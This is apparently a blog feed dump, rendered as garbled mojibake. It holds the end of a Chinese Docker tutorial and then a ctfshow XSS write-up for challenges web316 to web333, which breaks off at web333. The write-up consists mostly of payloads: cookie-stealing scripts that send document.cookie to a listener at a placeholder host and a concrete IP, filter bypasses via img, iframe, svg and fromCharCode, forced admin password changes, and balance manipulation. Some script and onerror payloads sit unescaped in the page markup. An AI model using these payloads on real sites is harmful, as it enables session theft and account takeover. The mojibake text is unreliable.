æ²¡æœ‰ä¸‹è½½docker&#x2F;getting-startedçš„è¿›è¡Œ,è¿™é‡Œä¼šè‡ªåŠ¨å¸®ä½ ä¸‹è½½<br> æˆåŠŸå¯åŠ¨å,å¯ä»¥åœ¨æµè§ˆå™¨ä¸­è¾“å…¥<code>http://localhost:8080/</code>å³å¯çœ‹åˆ°å¦‚ä¸‹é¡µé¢</p><p><img src="/2023/09/20/Docker%20file%20%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/image/image-20230919191443576-1700990334962-124-1700994526524-99.png"></p><h2 id="ä½¿ç”¨äº¤äº’å¼å®¹å™¨"><a href="#ä½¿ç”¨äº¤äº’å¼å®¹å™¨" class="headerlink" title="ä½¿ç”¨äº¤äº’å¼å®¹å™¨"></a>ä½¿ç”¨äº¤äº’å¼å®¹å™¨</h2><p>ä¸Šé¢æˆ‘ä»¬æˆåŠŸå°†é•œåƒå˜æˆäº†å®¹å™¨,ä½†ä¸Šè¿°çš„å‘½ä»¤ä¸­æˆ‘ä»¬éƒ½åŠ å…¥äº†-d,è®©å®¹å™¨åœ¨åå°è¿è¡Œäº†ã€‚ä¸‹é¢æˆ‘ä»¬å°±æ¥è®²å¦‚ä½•å’Œæ­£åœ¨è¿è¡Œçš„å®¹å™¨è¿›è¡Œäº¤äº’ã€‚</p><h3 id="æŸ¥çœ‹å®¹å™¨-docker-ps"><a href="#æŸ¥çœ‹å®¹å™¨-docker-ps" class="headerlink" title="æŸ¥çœ‹å®¹å™¨(docker ps)"></a>æŸ¥çœ‹å®¹å™¨(docker ps)</h3><p>æŸ¥çœ‹å®¹å™¨ä¸»è¦ä¼šç”¨åˆ°pså‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># æŸ¥çœ‹å½“å‰æ‰€æœ‰æ­£åœ¨è¿è¡Œçš„å®¹å™¨</span><br><span class="line">docker ps</span><br><span class="line"># æŸ¥çœ‹å½“å‰æ‰€æœ‰çš„å®¹å™¨</span><br><span class="line">docker ps -a</span><br><span class="line"></span><br><span class="line"># ä½¿ç”¨è¿‡æ»¤å™¨(é™¤äº†nameå¤–,å¸¸ç”¨çš„è¿˜å¯ä»¥æŒ‡å®šid:id= ã€æ‰€æœ‰åœæ­¢çš„å®¹å™¨:status=exited,æ­£åœ¨è¿è¡Œçš„å®¹å™¨:status=running ç­‰)</span><br><span class="line"></span><br><span class="line">docker ps -f name=æŒ‡å®šçš„åå­—</span><br><span class="line"></span><br><span class="line"># æ˜¾ç¤º2ä¸ªä¸Šæ¬¡åˆ›å»ºçš„å®¹å™¨(2å¯ä»¥æ”¹å˜)</span><br><span class="line"></span><br><span class="line">docker ps -n 2</span><br><span class="line"></span><br><span class="line"># æ˜¾ç¤ºæœ€æ–°åˆ›å»ºçš„å®¹å™¨ï¼ˆåŒ…æ‹¬æ‰€æœ‰çŠ¶æ€ï¼‰</span><br><span class="line"></span><br><span class="line">docker ps -l</span><br><span class="line"></span><br><span class="line"># ä»…æ˜¾ç¤ºip</span><br><span class="line"></span><br><span class="line">docker ps -q</span><br><span class="line"></span><br><span class="line"> # æ˜¾ç¤ºå®¹å™¨å¤§å°</span><br><span class="line"></span><br><span class="line">docker ps -s</span><br></pre></td></tr></table></figure><table><thead><tr><th>æ ‡ç­¾</th><th>å«ä¹‰</th></tr></thead><tbody><tr><td>CONTAINER ID</td><td>é•œåƒID</td></tr><tr><td>IMAGE</td><td>åˆ›å»ºå®¹å™¨çš„é•œåƒåç§°</td></tr><tr><td>COMMAND</td><td>é»˜è®¤å¯åŠ¨å‘½ä»¤(å¯åŠ¨æ—¶ä¼šè‡ªåŠ¨æ‰§è¡Œ)</td></tr><tr><td>CREATED</td><td>åˆ›å»ºå®¹å™¨çš„æ—¥æœŸ</td></tr><tr><td>STATUS</td><td>å½“å‰çš„çŠ¶æ€(å¯åŠ¨äº†å¤šä¹…,å¤šä¹…ä¹‹å‰é€€å‡ºç­‰)</td></tr><tr><td>PORTS</td><td>æ˜ å°„çš„ç«¯å£</td></tr><tr><td>NAMES</td><td>å®¹å™¨çš„åç§°</td></tr><tr><td>SIZE</td><td>å®¹å™¨å¤§å°(ä½¿ç”¨-så‘½ä»¤å‚æ•°æ—¶æ‰èƒ½çœ‹åˆ°)</td></tr></tbody></table><h3 id="å¯åŠ¨å’Œå…³é—­å®¹å™¨"><a href="#å¯åŠ¨å’Œå…³é—­å®¹å™¨" class="headerlink" title="å¯åŠ¨å’Œå…³é—­å®¹å™¨"></a>å¯åŠ¨å’Œå…³é—­å®¹å™¨</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># åœæ­¢å®¹å™¨</span><br><span class="line"></span><br><span class="line">docker container stop å®¹å™¨åæˆ–å®¹å™¨id</span><br><span class="line"></span><br><span class="line"># æˆ–å¯ç®€å†™ä¸º</span><br><span class="line"></span><br><span class="line">docker stop å®¹å™¨åæˆ–å®¹å™¨id</span><br><span class="line"></span><br><span class="line"># å¼ºåˆ¶å…³é—­å®¹å™¨</span><br><span class="line"></span><br><span class="line">docker container kill å®¹å™¨åæˆ–å®¹å™¨id</span><br><span class="line"></span><br><span class="line"># æˆ–å¯ç®€å†™ä¸º</span><br><span class="line"></span><br><span class="line">docker kill å®¹å™¨åæˆ–å®¹å™¨id</span><br><span class="line"></span><br><span class="line"># å¯åŠ¨å®¹å™¨</span><br><span class="line"></span><br><span class="line">docker container start å®¹å™¨åæˆ–å®¹å™¨id</span><br><span class="line"></span><br><span class="line"># æˆ–å¯ç®€å†™ä¸º</span><br><span class="line"></span><br><span class="line">docker start å®¹å™¨åæˆ–å®¹å™¨id</span><br></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬æˆåŠŸå¯åŠ¨æˆ–è€…å…³é—­ä¸€ä¸ªå®¹å™¨çš„è¯,ä¼šè¿”å›å®¹å™¨åæˆ–è€…å®¹å™¨id</p><p>stopå’Œkillçš„åŒºåˆ«: stopæ˜¯æ¯”è¾ƒä¼˜é›…çš„å…³æ‰ä¸€ä¸ªå®¹å™¨,ç±»ä¼¼æˆ‘ä»¬æ­£å¸¸é€€å‡ºä¸€ä¸ªè½¯ä»¶,è€Œkillæ˜¯å½“ä¸€ä¸ªè¿›ç¨‹å‡ºç°æ„å¤–æ— æ³•æ­£å¸¸å…³é—­çš„æ—¶å€™,æˆ‘ä»¬å¼ºè¡Œè¿›è¡Œå…³é—­,æœ‰ç‚¹åƒæˆ‘ä»¬ä½¿ç”¨ä»»åŠ¡ç®¡ç†å™¨è¿›è¡Œç»“æŸè¿›ç¨‹æ“ä½œ</p><p>æ“ä½œåå°å®¹å™¨</p><p>ä¹‹å‰æˆ‘ä»¬ä¸‹è¿‡ä¸€ä¸ªkaliå¹¶ä¸”æ”¾åœ¨äº†åå°è¿è¡Œ,å¦‚æœæ²¡æœ‰ä¸‹è½½å¯ä»¥æ‰§è¡Œä¸‹åˆ—å‘½ä»¤(docker run -i -d -t â€“name&#x3D;kali-test kalilinux&#x2F;kali-rolling),ä¸‹é¢æˆ‘ä»¬å°±ç”¨ä¸‹é¢çš„å‘½ä»¤å¼€å¯kali(å¦‚æœä½ ä¸‹çš„æ˜¯å…¶ä»–ç³»ç»Ÿ,æ¯”å¦‚ubuntuä¹Ÿå¯ä»¥ä¸¾ä¸€åä¸‰ä¸€ä¸‹)<br>é¦–å…ˆæˆ‘ä»¬ç¡®ä¿æˆ‘ä»¬è¦è¿›å…¥çš„å®¹å™¨æ˜¯å¼€å¯çŠ¶æ€çš„,ä½¿ç”¨docker ps -aæŸ¥çœ‹å…¶ä¸­çš„STATUSå±æ€§æ˜¯å¦æ˜¯Upå¼€å¤´,å¦‚æœä¸æ˜¯å…ˆç…§ç€ä¸Šé¢å¯åŠ¨å®¹å™¨çš„æ–¹æ³•å¼€å¯å®¹å™¨<br>æˆ‘ä»¬å¼€å¯å®¹å™¨å,å¦‚æœéœ€è¦åœ¨å®¹å™¨å†…æ‰§è¡Œå‘½ä»¤,å¯ä»¥å°†åå°åˆ‡æ¢åˆ°å‰å°,ä¹Ÿå¯èƒ½ä½¿ç”¨dockerå‘½ä»¤å°†æˆ‘ä»¬éœ€è¦æ‰§è¡Œçš„å‘½ä»¤ä¼ å…¥ã€‚<br>æ“ä½œæ–¹æ³•æœ‰å¾ˆå¤šç§,è¿™é‡Œæˆ‘ä»¬ä»‹ç»ä¸€äº›æ¯”è¾ƒå¸¸ç”¨çš„æ–¹æ³•</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># å¦‚æœæˆ‘åªéœ€è¦æ‰§è¡Œç®€å•çš„ä¸€ä¸¤æ¡å‘½ä»¤å¯ä»¥ä½¿ç”¨docker exec</span><br><span class="line"></span><br><span class="line"># æ‰§è¡Œå•æ¡å‘½ä»¤ (-i: å¯åŠ¨å¹¶ä¸”ä¿ç•™äº¤äº’å¼å‘½ä»¤è¡Œ; -t:ä½œç”¨æ˜¯åˆ†é…ä¸€ä¸ªè™šæ‹Ÿçš„ç»ˆç«¯; docker run )</span><br><span class="line"></span><br><span class="line">docker exec -it å®¹å™¨åæˆ–å®¹å™¨id æ‰§è¡Œçš„å‘½ä»¤</span><br><span class="line"></span><br><span class="line"># æ¯”å¦‚</span><br><span class="line"></span><br><span class="line">docker exec -it kali-test whoami</span><br><span class="line"></span><br><span class="line"># ç”¨è¿™ç§æ–¹æ³•,æˆ‘ä»¬è¿˜å¯ä»¥å¯åŠ¨å‘½ä»¤è¡Œ,æ ¹æ®Linuxçš„ç‰¹æ€§,ç³»ç»Ÿç¨‹åºä¼šåœ¨/binä¸­,linuxä¸­å¸¸ç”¨çš„Shellæœ‰å¤šä¸ª,å…¶ä¸­å¤§éƒ¨åˆ†ç”¨çš„Linuxé»˜è®¤çš„ä¸ºbash</span><br><span class="line"></span><br><span class="line"># æ‰€ä»¥æˆ‘ä»¬å¯åŠ¨å‘½ä»¤å¯ä»¥è‡ªè¡Œå¦‚ä¸‹å‘½ä»¤(é™¤äº†/bin/bashå¤–,linuxä¸€èˆ¬è¿˜ä¼šå¸¦/bin/shã€/bin/rbashã€/bin/dashç­‰,å…·ä½“åŒºåˆ«å¯ä»¥è‡ªè¡Œç™¾åº¦)</span><br><span class="line"></span><br><span class="line">docker exec -it å®¹å™¨åæˆ–å®¹å™¨id /bin/bash</span><br><span class="line"></span><br><span class="line"># æ¯”å¦‚</span><br><span class="line"></span><br><span class="line">docker exec -it kali-test /bin/bash</span><br><span class="line"></span><br><span class="line"># é™¤äº†execå¤–è¿˜æœ‰attachå¯ä»¥ä½¿ç”¨,ä½†å®ƒæœ‰ä¸ªå¼Šç«¯,å¤šç»ˆç«¯å¯åŠ¨attachå,éƒ½ä¼šä¼šåŒæ­¥æ˜¾ç¤ºã€‚å¦‚æœæœ‰ä¸€ä¸ªçª—å£é˜»å¡äº†ï¼Œé‚£ä¹ˆå…¶ä»–çª—å£ä¹Ÿæ— æ³•å†è¿›è¡Œæ“ä½œã€‚</span><br><span class="line"></span><br><span class="line">docker attach å®¹å™¨åæˆ–å®¹å™¨id</span><br><span class="line"></span><br><span class="line"># æ¯”å¦‚</span><br><span class="line">docker attach kali-test</span><br></pre></td></tr></table></figure><table><thead><tr><th>execå¯é€‰å‚æ•°</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>-d</td><td>ä¼šåˆ›å»ºä¸€ä¸ªå®ˆæŠ¤å¼å®¹å™¨åœ¨åå°è¿è¡Œ(è¿™æ ·åˆ›å»ºå®¹å™¨åä¸ä¼šè‡ªåŠ¨ç™»å½•å®¹å™¨)ã€‚</td></tr><tr><td>-e</td><td>è®¾ç½®ç¯å¢ƒå˜é‡</td></tr><tr><td>-i</td><td>è¡¨ç¤ºä»¥ã€Šäº¤äº’æ¨¡å¼ã€‹è¿è¡Œå®¹å™¨ã€‚</td></tr><tr><td>-t</td><td>è¡¨ç¤ºå®¹å™¨å¯åŠ¨åä¼šè¿›å…¥å…¶å‘½ä»¤è¡Œã€‚åŠ å…¥è¿™ä¸¤ä¸ªå‚æ•°åï¼Œå®¹å™¨åˆ›å»ºå°±èƒ½ç™»å½•è¿›å»ã€‚å³åˆ†é…ä¸€ä¸ªä¼ªç»ˆç«¯ã€‚</td></tr><tr><td>-u</td><td>è®¾ç½®ç”¨æˆ·åå’ŒUIDã€‚</td></tr><tr><td>-w</td><td>è®¾ç½®å®¹å™¨å†…çš„å·¥ä½œç›®å½•ã€‚</td></tr></tbody></table><h3 id="å®¹å™¨åˆ¶ä½œæˆé•œåƒ"><a href="#å®¹å™¨åˆ¶ä½œæˆé•œåƒ" class="headerlink" title="å®¹å™¨åˆ¶ä½œæˆé•œåƒ"></a>å®¹å™¨åˆ¶ä½œæˆé•œåƒ</h3><ul><li><pre><code>æˆ‘ä»¬ä¸ºä»€ä¹ˆè¦æŠŠå®¹å™¨åˆ¶ä½œæˆé•œåƒ?- é•œåƒå¯ä»¥çœ‹ä½œä¸ºæ˜¯ä¸€ç§å¤‡ä»½,å¦‚æœæˆ‘ä»¬åæœŸç¯å¢ƒå‡ºç°äº†é—®é¢˜,å¯ä»¥è¿˜åŸåˆ°æ—©æœŸé•œåƒã€‚- é•œåƒä¾¿äºä¼ æ’­,å¯ä»¥è®©è‡ªå·±çš„å…¶ä»–è®¾å¤‡æˆ–ä»–äººçš„é‡å¤åˆ©ç”¨å˜å¾—æ›´åŠ ç®€å•å®¹æ˜“ã€‚- # å°†å®¹å™¨åˆ¶ä½œæˆé•œåƒ  docker commit å®¹å™¨å é•œåƒå  # é•œåƒæ‰“åŒ…å¤‡ä»½(æ‰“åŒ…å¤‡ä»½çš„æ–‡ä»¶ä¼šè‡ªåŠ¨å­˜æ”¾åœ¨å½“å‰å‘½ä»¤è¡Œçš„è·¯å¾„ä¸‹,å¦‚æœæƒ³è®©ä¿å­˜çš„æ–‡ä»¶å¯ä»¥æ‰“å¼€,å¯ä»¥åŠ .taråç¼€)  docker save -o ä¿å­˜çš„æ–‡ä»¶å é•œåƒå  # é•œåƒè§£å‹  docker load -i æ–‡ä»¶è·¯å¾„/å¤‡ä»½æ–‡ä»¶<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  æˆ‘ä»¬å°†æ‰“åŒ…å¤‡ä»½çš„é•œåƒå¯ä»¥é€šè¿‡ç½‘ç»œå‘é€åˆ°å…¶ä»–è®¾å¤‡ä¸Š,ä½¿ç”¨dockeré•œåƒè§£å‹å³å¯ç›´æ¥ä½¿ç”¨ä½ çš„ç¯å¢ƒã€‚</span><br><span class="line"></span><br><span class="line">  # Docker Dashboard(Docker ä»ªè¡¨æ¿)</span><br><span class="line"></span><br><span class="line">  Docker ä»ªè¡¨æ¿çš„ä¸»è¦ä½œç”¨ä¸º:å¿«é€Ÿè®¿é—®å®¹å™¨æ—¥å¿—ï¼Œå¯åŠ¨å®¹å™¨çš„ shellï¼Œå¹¶è½»æ¾ç®¡ç†å®¹å™¨ç”Ÿå‘½å‘¨æœŸï¼ˆåœæ­¢ã€åˆ é™¤ç­‰ï¼‰ã€‚</span><br><span class="line"></span><br><span class="line">![](./../image/image-20230919194210103-1700990334962-125-1700994526524-98.png)</span><br><span class="line"></span><br><span class="line"> åœ¨[Docker](https://so.csdn.net/so/search?q=Docker&amp;spm=1001.2101.3001.7020)ä¸­ï¼Œæˆ‘ä»¬æ— æ³•åˆ é™¤æ­£åœ¨è¿è¡Œçš„å®¹å™¨ï¼Œè¯·å…ˆå°†å…¶åœæ­¢ã€‚ </span><br><span class="line"></span><br><span class="line"> åœæ­¢æ‰€æœ‰æ­£åœ¨è¿è¡Œçš„å®¹å™¨ã€‚ </span><br><span class="line"></span><br><span class="line">   Terminal  </span><br><span class="line"></span><br><span class="line">```bash</span><br><span class="line">$ sudo docker stop $(sudo docker ps -aq)</span><br></pre></td></tr></table></figure></code></pre></li></ul><p> å¸ä¸‹æ‰€æœ‰åœæ­¢çš„å®¹å™¨ã€‚ </p><p>   Terminal  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo docker <span class="built_in">rm</span> $(sudo docker ps -aq)</span><br></pre></td></tr></table></figure><p>è¯¥é”™è¯¯çš„æ„æ€æ˜¯dockerå·²æœ‰ä¸€ä¸ªå®¹å™¨å ç”¨äº†ç›®å‰docker-composeé‡Œçš„subnetã€‚<br>è§£å†³æ–¹æ³•</p><p>1ã€ä¿®æ”¹å½“å‰docker-composeé‡Œçš„networké…ç½®ï¼Œæ¢ä¸€ä¸ªsubnet</p><p>2.æ‰§è¡Œå‘½ä»¤docker network prune ï¼ˆåŸå› ï¼šå³ä½¿å®¹å™¨åœæ­¢&#x2F;åˆ é™¤ï¼Œç½‘æ®µä¾æ—§ä¼šè¢«å ç”¨ï¼Œè¿è¡Œè¯¥å‘½ä»¤å¯æ¸…é™¤å ç”¨å­ç½‘ç½‘æ®µå³å¯ï¼‰</p><p>åœ¨Dockerfileæ‰€åœ¨ç›®å½•ä¸‹ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ„å»ºé•œåƒï¼š</p><p>å…¶ä¸­ï¼Œ<code>-t</code>å‚æ•°ç”¨äºæŒ‡å®šé•œåƒçš„åç§°ï¼Œ<code>.</code>è¡¨ç¤ºDockerfileæ‰€åœ¨ç›®å½•ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> ç¬”è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å­¦ä¹ ç¬”è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ctfshow XSSè·¨ç«™è„šæœ¬æ³¨å…¥æ¼æ´ Web316-Web333</title>
      <link href="/2023/09/18/ctfshow%20XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20web316-/"/>
      <url>/2023/09/18/ctfshow%20XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20web316-/</url>
      
        <content type="html"><![CDATA[<h1 id="ctfshow-XSSè·¨ç«™è„šæœ¬æ³¨å…¥æ¼æ´-web316-web333"><a href="#ctfshow-XSSè·¨ç«™è„šæœ¬æ³¨å…¥æ¼æ´-web316-web333" class="headerlink" title="ctfshow XSSè·¨ç«™è„šæœ¬æ³¨å…¥æ¼æ´ web316-web333"></a>ctfshow XSSè·¨ç«™è„šæœ¬æ³¨å…¥æ¼æ´ web316-web333</h1><p>åšé¢˜è¿‡ç¨‹è¦ç”¨åˆ°çš„å¹³å°<a href="https://xss.pt/%EF%BC%8C%E5%88%9B%E5%BB%BA%E8%B4%A6%E5%8F%B7%EF%BC%8C%E5%A5%BD%E5%A4%9Aplayload%EF%BC%8C%E5%9C%A8%E9%A1%B9%E7%9B%AE%E7%AE%A1%E7%90%86%E4%BA%86%E5%8F%AF%E7%9C%8B%E5%88%B0flag">https://xss.pt/ï¼Œåˆ›å»ºè´¦å·ï¼Œå¥½å¤šplayloadï¼Œåœ¨é¡¹ç›®ç®¡ç†äº†å¯çœ‹åˆ°flag</a></p><h2 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h2><p>ç”¨å¹³å°ä¸ŠpLAYloadæ€ä¹ˆæ˜¯éƒ½æ˜¯æœ‰no adminï¼Œå¾ˆå¥‡æ€ªï¼Œçœ‹åˆ°ç½‘ä¸Šç”¨æœåŠ¡å™¨ç›‘å¬ï¼Œæˆ‘ä¹Ÿç›‘å¬äº†ï¼Œå°±æ˜¯è¯´ï¼Œä¸ºå•¥è¿˜æ˜¯</p><p><img src="/2023/09/18/ctfshow%20XSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20web316-/image/image-20230916150656330-1700990328435-117-1700994521524-91.png"></p><p>æœå•¦</p><p>æœ€åç”¨è‡ªå·±æœåŠ¡å™¨ä¼ å…¥</p><script>location.href="http://ip:39543/"+document.cookie</script><p>æœåŠ¡å™¨python3 -m http.server 39543å¯å¾—åˆ°flag</p><h2 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h2><p>åŸç†åŒä¸Šï¼Œ<script>è¢«è¿‡æ»¤,æ¢æˆimg</p><img src='' onerror="location.href='http://ip:39543/'+document.cookie"><h2 id="web318"><a href="#web318" class="headerlink" title="web318"></a>web318</h2><p>æ¢iframeæ ‡ç­¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=document.location=&#x27;http://ip:39543/?cookie=&#x27;+document.cookie&gt;</span><br></pre></td></tr></table></figure><h2 id="web319"><a href="#web319" class="headerlink" title="web319"></a>web319</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=window.open(&#x27;http://123.57.236.154:39543/?cookie=&#x27;+document.cookie)&gt;</span><br></pre></td></tr></table></figure><h2 id="web320"><a href="#web320" class="headerlink" title="web320"></a>web320</h2><p>è¿‡æ»¤äº†ç©ºæ ¼</p><blockquote><p>ç»•è¿‡æ–¹æ³•ï¼š</p><p>TAB</p><p>/</p><p>/**/</p></blockquote><p>ä¸Šä¸€é¢˜playloadéœ€è¦ç®€å•å˜æ¢ä¸€ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe/onload=window.open(&#x27;http://123.57.236.154:39543/?cookie=&#x27;+document.cookie)&gt;</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨String.fromCharCodeæ¥è¿›è¡Œè½¬æ¢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=document.write(String.fromCharCode(60,115,67,82,105,80,116,32,115,82,67,61,47,47,120,115,46,115,98,47,49,66,113,117,62,60,47,115,67,114,73,112,84,62));&gt;</span><br></pre></td></tr></table></figure><h2 id="web321"><a href="#web321" class="headerlink" title="web321"></a>web321</h2><p>iframeä»ç„¶å¯ä»¥</p><h2 id="web322"><a href="#web322" class="headerlink" title="web322"></a>web322</h2><p>iframeä»ç„¶å¯ä»¥</p><h2 id="web323"><a href="#web323" class="headerlink" title="web323"></a>web323</h2><p>iframeä»ç„¶å¯ä»¥</p><h2 id="web324"><a href="#web324" class="headerlink" title="web324"></a>web324</h2><p>è¿™æ¬¡è¿‡æ»¤äº†iframe</p><p>æˆ‘ä¸çŸ¥é“ç”¨å•¥äº†ã€‚ã€‚ã€‚ã€‚</p><p>çœ‹äº†å¤§ä½¬çš„wpï¼Œç”¨svgè¿˜å¯ä»¥ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=window.open(&#x27;http://123.57.236.154:39543/?cookie=&#x27;+document.cookie)&gt;</span><br></pre></td></tr></table></figure><h2 id="web325"><a href="#web325" class="headerlink" title="web325"></a>web325</h2><p>svgä»å¯</p><h2 id="web326"><a href="#web326" class="headerlink" title="web326"></a>web326</h2><p>svgå¯</p><h2 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h2><p>åˆ°å­˜å‚¨å‹xss</p><p>ç›²çŒœä¸Šä¸€é¢˜playloadå¯ä»¥</p><p>æœç„¶ï¼Œå¯ä»¥</p><p>å½“ç„¶ä¹Ÿå¯ä»¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=window.open(&#x27;http://123.57.236.154::39543/&#x27;+document.cookie)&gt;</span><br></pre></td></tr></table></figure><h2 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(&#x27;http://123.57.236.154:39543/&#x27;+document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>å…ˆæ³¨å†Œï¼Œå¯†ç å°±æ˜¯ä¸Šé¢çš„xssï¼Œä¹‹åæˆ‘ä»¬ä¼šåœ¨æœåŠ¡å™¨è·å–åˆ°ç®¡ç†å‘˜çš„phpsession</p><p><img src="/./../image/image-20230916171228602-1700990328435-119-1700994521525-92.png" alt="image-20230916171228602"></p><p>ä¹‹åå°†æµè§ˆå™¨PHPsessionæ”¹æˆç›‘å¬åˆ°çš„ï¼ŒæŸ¥çœ‹ç”¨æˆ·ç®¡ç†ï¼Œå¯å¾—åˆ°flag</p><p><img src="/./../image/image-20230916171325595-1700990328435-118-1700994521525-93.png"></p><h2 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h2><p>è¿™æ¬¡cookieä¸æŒä¹…ï¼Œæ‰€ä»¥å°±ç›´æ¥è·å–é¡µé¢ä¿¡æ¯ï¼Œé€šè¿‡documentæ¥è·å–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(&#x27;http://123.57.236.154:39543/&#x27;+document.getElementsByClassName(&#x27;layui-table-cell laytable-cell-1-0-1&#x27;)[1].innerHTML)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>å¯ç›´æ¥ç›‘å¬åˆ°flag</p><h2 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h2><p>æ³¨å†Œæ—¶ç”¨æˆ·åä¸º</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;window.open(&#x27;http://127.0.0.1/api/change.php?p=123456&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>å¯†ç éšä¾¿ï¼Œå°†adminå¯†ç æ”¹ä¸º123456</p><p>ç­‰å¾…ä¸€ä¼šç™»å½•adminï¼Œå¯†ç ä¸º123456</p><h2 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.ajax(&#123;url:&quot;api/change.php&quot;,method:&quot;POST&quot;,data:&#123;&#x27;p&#x27;:&#x27;1234567&#x27;&#125;&#125;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>æ¢äº†postä¼ å‚æ–¹æ³•ã€‚åŸç†åŒä¸Š</p><h2 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script&gt;$.ajax(&#123;url: &quot;http://127.0.0.1/api/amount.php&quot;,method: &quot;POST&quot;,data: &#123;&#x27;u&#x27;=&#x27;gylq&#x27;,&#x27;a&#x27;:10000&#125;,cache: false,success: function(res)&#123;&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>ç»™adminè´¦æˆ·è®¾ç½®ä¸º10000</p><p>æ³¨å†Œä¸Šå…ˆï¼Œç™»å½•ã€‚ç»™adminè½¬-10000ï¼Œåœ¨è´­ä¹°flag</p><h2 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 